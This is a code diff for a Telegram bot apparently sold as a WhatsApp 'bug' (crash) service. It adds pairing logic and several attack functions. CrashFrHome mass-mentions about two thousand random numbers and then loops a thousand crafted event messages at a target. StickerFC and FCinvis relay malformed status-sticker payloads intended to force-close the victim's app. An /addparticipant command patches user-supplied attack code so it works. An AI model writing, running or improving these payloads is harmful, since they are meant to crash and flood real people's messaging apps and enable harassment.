@@ -26,9 +26,13 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.42";
+const CURRENT_VERSION = "3.0.44";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 const PENDING_UPDATE_FILE = "./database/pending_update.json";
+
+// Konstanta pairing
+const PAIRING_TIMEOUT = 45000;
+const PAIRING_COOLDOWN = 5000;
 
 // Load auto update setting
 let autoUpdateEnabled = true;
@@ -54,7 +58,6 @@ function saveAutoUpdateSetting(enabled) {
     }
 }
 
-// Save pending update notification
 function savePendingUpdate(chatId, oldVersion, newVersion) {
     try {
         fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
@@ -270,21 +273,14 @@ function stopAutoUpdateChecker() {
     }
 }
 
-// ================= SAFE FUNCTIONS (Anti Error) ================= //
+// ================= SAFE FUNCTIONS ================= //
 
 async function safeSendMessage(chatId, text, options = {}) {
-    if (!chatId) {
-        console.error("❌ chat_id kosong!");
-        return null;
-    }
+    if (!chatId) return null;
     try {
         return await bot.sendMessage(chatId, text, options);
     } catch (error) {
-        if (error.response?.body?.description?.includes("chat_id is empty")) {
-            console.error("❌ Error: chat_id is empty");
-        } else {
-            console.error("Error sending message:", error.message);
-        }
+        console.error("Error sending message:", error.message);
         return null;
     }
 }
@@ -298,12 +294,8 @@ async function safeEditMessageText(chatId, messageId, newText, options = {}) {
             ...options
         });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) {
-            return null;
-        }
-        if (error.response?.body?.description?.includes("message to edit not found")) {
-            return null;
-        }
+        if (error.response?.body?.description?.includes("message is not modified")) return null;
+        if (error.response?.body?.description?.includes("message to edit not found")) return null;
         console.error("Error editing message:", error.message);
         return null;
     }
@@ -318,12 +310,8 @@ async function safeEditMessageMedia(chatId, messageId, media, options = {}) {
             ...options
         });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) {
-            return null;
-        }
-        if (error.response?.body?.description?.includes("message to edit not found")) {
-            return null;
-        }
+        if (error.response?.body?.description?.includes("message is not modified")) return null;
+        if (error.response?.body?.description?.includes("message to edit not found")) return null;
         console.error("Error editing media:", error.message);
         return null;
     }
@@ -337,12 +325,8 @@ async function safeEditMessageReplyMarkup(chatId, messageId, replyMarkup) {
             message_id: messageId
         });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) {
-            return null;
-        }
-        if (error.response?.body?.description?.includes("message to edit not found")) {
-            return null;
-        }
+        if (error.response?.body?.description?.includes("message is not modified")) return null;
+        if (error.response?.body?.description?.includes("message to edit not found")) return null;
         return null;
     }
 }
@@ -384,7 +368,7 @@ Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}
 console.log(chalk.blue(`
 [ 🚀 BOT BERJALAN... ]
 `));
-};
+}
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
@@ -608,14 +592,21 @@ function createSessionDir(botNumber) {
 }
 
 async function ConnectToWhatsApp(botNumber, chatId) {
-    // Cek apakah pairing sedang berlangsung untuk nomor ini
     if (pairingInProgress.has(botNumber)) {
-        await safeSendMessage(chatId, `⚠️ *Pairing sedang berlangsung untuk nomor ${botNumber}*\nSilakan tunggu hingga selesai.`, { parse_mode: "Markdown" });
-        return;
+        const progressTime = pairingInProgress.get(botNumber);
+        const elapsed = Date.now() - progressTime;
+        if (elapsed < PAIRING_COOLDOWN) {
+            await safeSendMessage(chatId, `⚠️ *Pairing sedang berlangsung untuk nomor ${botNumber}*\nSilakan tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`, { parse_mode: "Markdown" });
+            return;
+        } else {
+            pairingInProgress.delete(botNumber);
+        }
     }
     
-    pairingInProgress.set(botNumber, true);
+    pairingInProgress.set(botNumber, Date.now());
     let statusMessage = null;
+    let connectionEstablished = false;
+    let pairingTimeout = null;
     
     try {
         const sentMsg = await safeSendMessage(chatId, `
@@ -624,11 +615,13 @@ async function ConnectToWhatsApp(botNumber, chatId) {
 — Status : Connecting...
 `, { parse_mode: "HTML" });
         if (sentMsg) statusMessage = sentMsg.message_id;
-    } catch (error) {}
+    } catch (error) {
+        pairingInProgress.delete(botNumber);
+        throw error;
+    }
 
     const sessionDir = createSessionDir(botNumber);
     
-    // Hapus creds.json lama jika ada error koneksi
     const credsPath = path.join(sessionDir, 'creds.json');
     if (fs.existsSync(credsPath)) {
         try {
@@ -643,115 +636,179 @@ async function ConnectToWhatsApp(botNumber, chatId) {
         auth: state,
         printQRInTerminal: false,
         logger: P({ level: "silent" }),
-        defaultQueryTimeoutMs: undefined,
-        keepAliveIntervalMs: 60000,
-        connectTimeoutMs: 90000,
+        defaultQueryTimeoutMs: 30000,
+        keepAliveIntervalMs: 30000,
+        connectTimeoutMs: 30000,
         emitOwnEvents: true,
-        fireInitQueries: true,
+        fireInitQueries: false,
         syncFullHistory: false,
         markOnlineOnConnect: false,
         generateHighQualityLinkPreview: false,
         patchMessageBeforeSending: (msg) => msg,
     });
 
-    let pairingCodeSent = false;
-    let connectionEstablished = false;
+    let pairingCodeRequested = false;
+
+    const cleanup = () => {
+        if (pairingTimeout) clearTimeout(pairingTimeout);
+        pairingInProgress.delete(botNumber);
+    };
 
     return new Promise((resolve, reject) => {
-        const timeout = setTimeout(() => {
+        pairingTimeout = setTimeout(() => {
             if (!connectionEstablished) {
-                pairingInProgress.delete(botNumber);
-                reject(new Error("Connection timeout"));
+                console.log(`⏰ Pairing timeout for ${botNumber}`);
+                cleanup();
+                if (statusMessage) {
+                    safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}
+— Status : Timeout ⏰ (Silakan coba lagi)
+`, { parse_mode: "HTML" }).catch(() => {});
+                }
+                reject(new Error("Pairing timeout"));
             }
-        }, 90000);
+        }, PAIRING_TIMEOUT);
 
         newSock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
+            const { connection, lastDisconnect, qr, pairingCode } = update;
             
-            if (connection === "open") {
-                clearTimeout(timeout);
-                connectionEstablished = true;
-                sessions.set(botNumber, newSock);
-                saveActiveSessions(botNumber);
-                startPingInterval(botNumber, newSock);
-                pairingInProgress.delete(botNumber);
+            if (pairingCode && !pairingCodeRequested) {
+                pairingCodeRequested = true;
+                const formattedCode = pairingCode.match(/.{1,4}/g)?.join("-") || pairingCode;
                 
                 if (statusMessage) {
                     await safeEditMessageText(chatId, statusMessage, `
-<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
 — Number : ${botNumber}
-— Status : Connected ✅
+— Pairing Code : <code>${formattedCode}</code>
+— Status : Waiting for pairing...
 `, { parse_mode: "HTML" });
                 }
-                resolve(newSock);
-                
-            } else if (connection === "close") {
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                console.log(`Connection closed for ${botNumber}, statusCode: ${statusCode}`);
-                
-                if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
-                    clearTimeout(timeout);
-                    pairingInProgress.delete(botNumber);
+                console.log(`📱 Pairing code for ${botNumber}: ${formattedCode}`);
+            }
+            
+            if (connection === "open") {
+                if (!connectionEstablished) {
+                    connectionEstablished = true;
+                    clearTimeout(pairingTimeout);
+                    cleanup();
+                    
+                    sessions.set(botNumber, newSock);
+                    saveActiveSessions(botNumber);
+                    startPingInterval(botNumber, newSock);
+                    
+                    console.log(`✅ WhatsApp ${botNumber} connected successfully!`);
+                    
                     if (statusMessage) {
                         await safeEditMessageText(chatId, statusMessage, `
-<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+<blockquote>Primrose Linux Bot [ ✅ ]</blockquote>
 — Number : ${botNumber}
-— Status : Gagal ❌ (Session expired)
+— Status : Connected Successfully!
 `, { parse_mode: "HTML" });
                     }
+                    resolve(newSock);
+                }
+            } else if (connection === "close") {
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                const errorMessage = lastDisconnect?.error?.message || "Unknown error";
+                
+                console.log(`Connection closed for ${botNumber}, statusCode: ${statusCode}, error: ${errorMessage}`);
+                
+                cleanup();
+                
+                if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
+                    if (statusMessage) {
+                        await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
+— Number : ${botNumber}
+— Status : Gagal (Logged out / Blocked)
+`, { parse_mode: "HTML" });
+                    }
+                    removeActiveSession(botNumber);
                     reject(new Error("Logged out or blocked"));
-                } else {
-                    // Reconnect
-                    setTimeout(async () => {
+                    
+                } else if (statusCode === 428) {
+                    if (!connectionEstablished && !pairingCodeRequested) {
                         try {
-                            await ConnectToWhatsApp(botNumber, chatId);
-                            clearTimeout(timeout);
-                            resolve();
+                            const code = await newSock.requestPairingCode(botNumber);
+                            pairingCodeRequested = true;
+                            const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+                            
+                            if (statusMessage) {
+                                await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
+— Number : ${botNumber}
+— Pairing Code : <code>${formattedCode}</code>
+— Status : Waiting for pairing...
+`, { parse_mode: "HTML" });
+                            }
                         } catch (err) {
+                            if (statusMessage) {
+                                await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
+— Number : ${botNumber}
+— Status : Error requesting pairing code
+`, { parse_mode: "HTML" });
+                            }
                             reject(err);
                         }
-                    }, 5000);
+                    }
+                    
+                } else if (statusCode === 408 || statusCode === 503) {
+                    if (statusMessage) {
+                        await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>
+— Number : ${botNumber}
+— Status : Connection timeout (Coba lagi)
+`, { parse_mode: "HTML" });
+                    }
+                    reject(new Error(`Connection timeout (${statusCode})`));
+                    
+                } else {
+                    if (statusMessage) {
+                        await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
+— Number : ${botNumber}
+— Status : Error (${statusCode || 'unknown'})
+`, { parse_mode: "HTML" });
+                    }
+                    reject(new Error(`Connection closed: ${statusCode}`));
                 }
                 
             } else if (connection === "connecting") {
                 if (statusMessage) {
                     await safeEditMessageText(chatId, statusMessage, `
-<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>
 — Number : ${botNumber}
 — Status : Connecting...
 `, { parse_mode: "HTML" });
-                }
-                
-                // Request pairing code jika belum
-                if (!pairingCodeSent && !fs.existsSync(credsPath)) {
-                    pairingCodeSent = true;
-                    try {
-                        const code = await newSock.requestPairingCode(botNumber);
-                        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-                        
-                        if (statusMessage) {
-                            await safeEditMessageText(chatId, statusMessage, `
-<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
-— Number : ${botNumber}
-— Pairing Code : ${formattedCode}
-— Status : Waiting for pairing...
-`, { parse_mode: "HTML" });
-                        }
-                    } catch (err) {
-                        console.error("Error requesting pairing code:", err);
-                        if (statusMessage) {
-                            await safeEditMessageText(chatId, statusMessage, `
-<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
-— Number : ${botNumber}
-— Status : Error: ${err.message}
-`, { parse_mode: "HTML" });
-                        }
-                    }
                 }
             }
         });
 
         newSock.ev.on("creds.update", saveCreds);
+        
+        setTimeout(async () => {
+            if (!pairingCodeRequested && !connectionEstablished) {
+                try {
+                    pairingCodeRequested = true;
+                    const code = await newSock.requestPairingCode(botNumber);
+                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+                    
+                    if (statusMessage) {
+                        await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
+— Number : ${botNumber}
+— Pairing Code : <code>${formattedCode}</code>
+— Status : Waiting for pairing...
+`, { parse_mode: "HTML" });
+                    }
+                } catch (err) {
+                    console.log(`Error requesting pairing code for ${botNumber}:`, err.message);
+                }
+            }
+        }, 2000);
     });
 }
 
@@ -868,40 +925,16 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
     
     let keyboard = [
         [
-            {
-                text: "XBUGS",
-                callback_data: "trashmenu",
-                style: buttonStyle
-            },
-            {
-                text: "XTOOLSBUG",
-                callback_data: "toolsbug_menu",
-                style: buttonStyle
-            }
+            { text: "XBUGS", callback_data: "trashmenu", style: buttonStyle },
+            { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }
         ],
         [
-            {
-                text: "XSETTINGS",
-                callback_data: "owner_menu",
-                style: buttonStyle
-            },
-            {
-                text: "XGROUPSECURITY",
-                callback_data: "group_security_menu",
-                style: buttonStyle
-            }
+            { text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle },
+            { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }
         ],
         [
-            {
-                text: "XCHANGECOLOR",
-                callback_data: "change_color_menu",
-                style: buttonStyle
-            },
-            {
-                text: "DEVELOPERS",
-                url: "https://t.me/ItsMeXanderRzMd",
-                style: buttonStyle
-            }
+            { text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle },
+            { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }
         ]
     ]
 
@@ -930,27 +963,21 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
                 caption: caption,
                 parse_mode: "HTML"
             }, {
-                reply_markup: {
-                    inline_keyboard: keyboard
-                }
+                reply_markup: { inline_keyboard: keyboard }
             });
             sent = { message_id: editMessageId };
         } catch (error) {
             sent = await safeSendPhoto(chatId, randomImage, {
                 caption: caption,
                 parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: keyboard
-                }
+                reply_markup: { inline_keyboard: keyboard }
             });
         }
     } else {
         sent = await safeSendPhoto(chatId, randomImage, {
             caption: caption,
             parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: keyboard
-            }
+            reply_markup: { inline_keyboard: keyboard }
         });
     }
 
@@ -975,40 +1002,16 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
 
             let newKeyboard = [
                 [
-                    {
-                        text: "XBUGS",
-                        callback_data: "trashmenu",
-                        style: newStyle
-                    },
-                    {
-                        text: "XTOOLSBUG",
-                        callback_data: "toolsbug_menu",
-                        style: newStyle
-                    }
+                    { text: "XBUGS", callback_data: "trashmenu", style: newStyle },
+                    { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }
                 ],
                 [
-                    {
-                        text: "XSETTINGS",
-                        callback_data: "owner_menu",
-                        style: newStyle
-                    },
-                    {
-                        text: "XGROUPSECURITY",
-                        callback_data: "group_security_menu",
-                        style: newStyle
-                    }
+                    { text: "XSETTINGS", callback_data: "owner_menu", style: newStyle },
+                    { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }
                 ],
                 [
-                    {
-                        text: "XCHANGECOLOR",
-                        callback_data: "change_color_menu",
-                        style: newStyle
-                    },
-                    {
-                        text: "DEVELOPERS",
-                        url: "https://t.me/ItsMeXanderRzMd",
-                        style: newStyle
-                    }
+                    { text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle },
+                    { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }
                 ]
             ]
 
@@ -1124,7 +1127,9 @@ function extractCelah(code) {
         'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs,
         'templateMessage': /templateMessage\s*:\s*{([^}]+)}/gs,
         'stickerPackMessage': /stickerPackMessage\s*:\s*{([^}]+)}/gs,
-        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs
+        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs,
+        'extendedTextMessage': /extendedTextMessage\s*:\s*{([^}]+)}/gs,
+        'delayinvis': /async\s+function\s+delayinvis\s*\([^)]*\)\s*{[^}]*}/gs
     };
     let results = [];
     for (const [type, pattern] of Object.entries(patterns)) {
@@ -1140,7 +1145,46 @@ function extractCelah(code) {
     return results;
 }
 
-// ================= FITUR CEKFUNC & AUTO FIX ================= //
+// ================= ADD PARTICIPANT FUNCTION ================= //
+function addParticipantToCode(code) {
+    const hasParticipant = code.includes('participant: { jid: target }') || 
+                          code.includes('}, { participant:') ||
+                          code.includes('{ participant: { jid: target } }');
+    
+    if (hasParticipant) {
+        return { hasAlready: true, fixedCode: code, message: "✅ Participant sudah ada dalam code." };
+    }
+    
+    let fixed = code;
+    
+    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
+        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 
+            'sock.relayMessage(target, message, { participant: { jid: target } })');
+        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
+    }
+    
+    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
+        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*(\{[^}]*\})\s*\)/g, 
+            'sock.relayMessage(target, message, { ...$1, participant: { jid: target } })');
+        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke parameter ketiga." };
+    }
+    
+    if (/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
+        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*(\{[^}]*\})\s*\)/g, 
+            'sock.relayMessage(\'status@broadcast\', msg, { ...$1, participant: { jid: target } })');
+        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke status broadcast." };
+    }
+    
+    if (/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
+        fixed = fixed.replace(/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 
+            'await sock.relayMessage(target, message, { participant: { jid: target } })');
+        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
+    }
+    
+    return { hasAlready: false, fixedCode: code, message: "⚠️ Tidak ditemukan pattern relayMessage dalam code." };
+}
+
+// ================= AUTO FIX ENGINE ================= //
 function autoFixJavaScript(code, error) {
     let fixed = code;
     const fixes = [];
@@ -1190,22 +1234,6 @@ function autoFixJavaScript(code, error) {
         fixed = fixed.replace(/\bvar\s+/g, 'let ');
         fixes.push('Changed var to let');
     }
-    if (fixed.includes('async function') && !fixed.includes('return')) {
-        const linesArr = fixed.split('\n');
-        for (let i = 0; i < linesArr.length; i++) {
-            if (linesArr[i].includes('async function') && linesArr[i+1] && linesArr[i+1].includes('{')) {
-                for (let j = linesArr.length - 1; j > i; j--) {
-                    if (linesArr[j].includes('}')) {
-                        linesArr[j] = '  return true;\n' + linesArr[j];
-                        fixes.push('Added return statement');
-                        break;
-                    }
-                }
-                break;
-            }
-        }
-        fixed = linesArr.join('\n');
-    }
     if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) {
         fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)');
         fixes.push('Added missing parameters (sock, target)');
@@ -1219,7 +1247,7 @@ function autoFixJavaScript(code, error) {
     return { fixed, fixes };
 }
 
-// ================= FITUR TESTFUNCTION ================= //
+// ================= TESTFUNCTION ================= //
 async function executeTestFunction(sock, target, funcCode, jumlah) {
     try {
         const matchFunc = funcCode.match(/async function\s+(\w+)/);
@@ -1246,6 +1274,150 @@ async function executeTestFunction(sock, target, funcCode, jumlah) {
         return false;
     }
 }
+
+async function checkUserAccess(userId, chatId, chatType, commandName) {
+    const isOwnerUser = isOwner(userId);
+    const isPremiumUser = isPremium(userId);
+    if (isCommandBlocked(commandName)) return false;
+    if (isOwnerUser) return true;
+    if (chatType === "private" && !isPremiumUser) {
+        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+        return false;
+    }
+    return true;
+}
+
+function getCurrentDate() {
+    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+}
+
+function createBugSuccessMessage(targetNumber, bugType, date) {
+    return `
+<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
+
+◉ Target : ${targetNumber}
+◉ Type Bug : ${bugType}
+◉ Status : Successfully Send
+◉ Date Now : ${date}
+
+<blockquote>⸙ Spam Free at will</blockquote>`;
+}
+
+function createCheckButton(targetNumber) {
+    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
+}
+
+// ================= BUG FUNCTIONS ================= //
+async function CrashFrHome(sock, target) {
+    try {
+        const stickerMsg = {
+            viewOnceMessage: {
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                        mimetype: "image/webp",
+                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                        fileLength: { low: 1, high: 0, unsigned: true },
+                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                        isAnimated: true,
+                        contextInfo: {
+                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
+                        },
+                    },
+                },
+            },
+        };
+        await sock.sendMessage(target, stickerMsg);
+        for (let i = 0; i < 1000; i++) {
+            await sock.sendMessage(target, {
+                viewOnceMessage: {
+                    message: {
+                        eventMessage: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: "33333333333333333@newsletter",
+                                newsletterName: "FrezeHomeAbouse",
+                            },
+                        },
+                    },
+                },
+            });
+            await sleep(50);
+        }
+    } catch (e) {}
+}
+
+async function StickerFC(sock, target) {
+    try {
+        const message = {
+            "groupStatusMessageV2": {
+                "message": {
+                    "stickerMessage": {
+                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                        "mimetype": "image/webp",
+                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                        "fileLength": "10610",
+                        "mediaKeyTimestamp": "1775044724",
+                        "stickerSentTs": "1775044724091"
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, message, {});
+    } catch (err) {}
+}
+
+async function FCinvisTes(sock, target) {
+    const message = {
+        "groupStatusMessageV2": {
+            "message": {
+                "stickerMessage": {
+                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    "mimetype": "image/webp",
+                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    "fileLength": "10610",
+                    "mediaKeyTimestamp": "1775044724",
+                    "stickerSentTs": "1775044724091"
+                }
+            }
+        }
+    };
+    return await sock.relayMessage(target, message, { participant: { jid: target } });
+}
+
+async function FCinvis(sock, target) {
+    return await FCinvisTes(sock, target);
+}
+
+async function brem(sock, target) { }
+async function VisiFriend(sock, target) { }
+async function OfferXForclose(sock, target) { }
+async function bulldozerV2(sock, target) { }
+async function xatanicaldelayv2(sock, target) { }
+async function MbaPe(sock, target) { }
+
+// ================= COMMANDS ================= //
+
+bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    const from = msg.from;
+    const userId = from.id;
+    const chatType = msg.chat.type;
+    const isGroup = chatType === "group" || chatType === "supergroup";
+    const isOwnerUser = OWNER_ID.toString() === userId.toString();
+    if (!isGroup && !isPremium(userId) && !isOwnerUser) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+    }
+    await sendStartMenu(chatId, from);
+});
 
 bot.onText(/\/cekfunc/, async (msg) => {
     const chatId = msg.chat.id;
@@ -1297,7 +1469,53 @@ bot.onText(/\/cekfunc/, async (msg) => {
     }
 });
 
-// ================= FITUR CELAHFUNC ================= //
+bot.onText(/\/addparticipant/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "addparticipant");
+    if (!hasAccess) return;
+    
+    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
+        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Reply function JavaScript.\n2. Ketik /addparticipant", { parse_mode: "Markdown" });
+    }
+    
+    let code = '';
+    if (msg.reply_to_message.text) {
+        code = msg.reply_to_message.text;
+    } else if (msg.reply_to_message.document) {
+        const file = await bot.getFile(msg.reply_to_message.document.file_id);
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+        const response = await axios.get(fileUrl);
+        code = response.data;
+    }
+    
+    const loadingMsg = await safeSendMessage(chatId, "👤 *Memeriksa participant...*", { parse_mode: "Markdown" });
+    if (!loadingMsg) return;
+    
+    const result = addParticipantToCode(code);
+    
+    if (result.hasAlready) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT SUDAH ADA*\n\n${result.message}\n\nTidak perlu ditambahkan lagi.`, { parse_mode: "Markdown" });
+        return;
+    }
+    
+    if (result.message.includes("Tidak ditemukan pattern")) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `⚠️ *PARTICIPANT TIDAK DITEMUKAN*\n\n${result.message}\n\nPastikan code berisi \`relayMessage\` atau \`sock.relayMessage\`.`, { parse_mode: "Markdown" });
+        return;
+    }
+    
+    if (result.fixedCode.length > 3500) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT DITAMBAHKAN!*\n\nCode terlalu panjang, dikirim sebagai file.`, { parse_mode: "Markdown" });
+        const filePath = `participant_fixed_${Date.now()}.js`;
+        fs.writeFileSync(filePath, result.fixedCode);
+        await bot.sendDocument(chatId, filePath, { caption: `✅ Code dengan participant` });
+        fs.unlinkSync(filePath);
+    } else {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT DITAMBAHKAN!*\n\n${result.message}\n\n🟢 *HASIL:*\n\`\`\`javascript\n${result.fixedCode}\n\`\`\``, { parse_mode: "Markdown" });
+    }
+});
+
 bot.onText(/\/celahfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1334,7 +1552,6 @@ bot.onText(/\/celahfunc/, async (msg) => {
     await safeEditMessageText(chatId, loadingMsg.message_id, response, { parse_mode: "HTML" });
 });
